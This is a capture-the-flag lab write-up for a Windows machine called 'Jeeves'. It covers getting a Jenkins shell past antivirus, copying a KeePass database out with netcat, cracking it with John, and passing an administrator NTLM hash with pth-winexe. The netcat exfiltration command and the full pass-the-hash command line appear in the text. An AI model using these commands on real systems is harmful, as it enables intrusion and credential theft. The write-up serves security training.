# Jeeves

*Converted from: Jeeves.pdf*

---

# Jeeves
## **20 [th] December 2017 / Document No D17.100.39**

**Prepared By: Alexander Reid (Arrexel)**

**Machine Author: mrb3n**

**Difficulty: Medium**

**Classification: Official**


Page 1 / 8


## **SYNOPSIS**

Jeeves is not overly complicated, however it focuses on some interesting techniques and

provides a great learning experience. As the use of alternate data streams is not very common,

some users may have a hard time locating the correct escalation path.


## **Skills Required**


  - Intermediate knowledge of Windows

  - Knowledge of basic web fuzzing

techniques


## **Skills Learned**


  - Obtaining shell through Jenkins

  - Techniques for bypassing Windows

Defender

  - Pass-the-hash attacks

  - Enumerating alternate data streams


Page 2 / 8


## **Enumeration** **Nmap**

Nmap reveals an IIS server, RPC, Microsoft-ds and a Jetty server.



Page 3 / 8


​


## **Dirbuster**

Fuzzing the Jetty server reveals an **askjeeves** ​ directory which contains a Jenkins server.


Page 4 / 8



​


​


​ ​


​ ​


## **Exploitation** **Jenkins**

Netcat for Windows: [https://eternallybored.org/misc/netcat/​](https://eternallybored.org/misc/netcat/)


Using Jenkins to acquire a shell is fairly straightforward, however there is an antivirus running on

the target which prevents most Metasploit-based payloads from running. An easy workaround for

this is to upload a copy of Netcat for Windows and use it to connect back.


Code execution is trivial with Jenkins. Simply creating a new item and adding a build step

(Execute Windows batch command) is all that is required. Jenkins will execute each line in order

when the project is built.


Receiving the connection with **nc -nvlp 1234** ​ grants access as the **kohsuke** ​ user.


A bit of browsing quickly reveals a **CEH.kdbx** ​ file in the **Documents** ​ directory.


Page 5 / 8



​


​ ​


​ ​



​


​ ​


​ ​


​

​

​


​

​


​


## **Privilege Escalation** **KeePass Database**

​

​

​


​

​


​



Cracking the KeePass database password is fairly simple. The **kdbx** ​ file can be transferred to the

​

​


​

​


​



​

attacking machine using Netcat. The command **nc -lp 1235 > jeeves.kdbx** ​ will listen for data on

the attacking machine and pipe it to a file. Running the command **nc.exe -w 3 <LAB IP> 1235 <** ​


​

​


​



​

​

​

**CEH.kdbx** on the target will complete the transfer.


​

​


​



​

​

​


With the database at hand, cracking is as easy as extracting the hash with **keepass2john** ​

**jeeves.kdbx > jeeves.hash** and running John with **john jeeves.hash** ​


​



​

​

​


​

​


​



​

​

​


​

​


Once the database is open, several passwords are accessible, however only the **Backup stuff** ​

entry is important.


Page 6 / 8



​

​

​


​

​


​


​


## **Pass the Hash**

The **Backup stuff** ​ entry in the KeePass file is an NTLM hash for the Administrator user. Using the

pass-the-hash technique allows for fairly simple spawning of a session. The command

**pth-winexe -U**

**jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cb**

**e81fe00 //10.10.10.63 cmd** will immediately grant a shell as the administrator.


Page 7 / 8



​


​


​


## **Alternate Data Stream**

There is an alternate data stream for the **hm.txt** ​ file, which can be discovered with the command

**dir /R**


Reading the stream can be done with the command **powershell Get-Content -Path "hm.txt"** ​

**-Stream "root.txt"**


Page 8 / 8



​


​



​


​


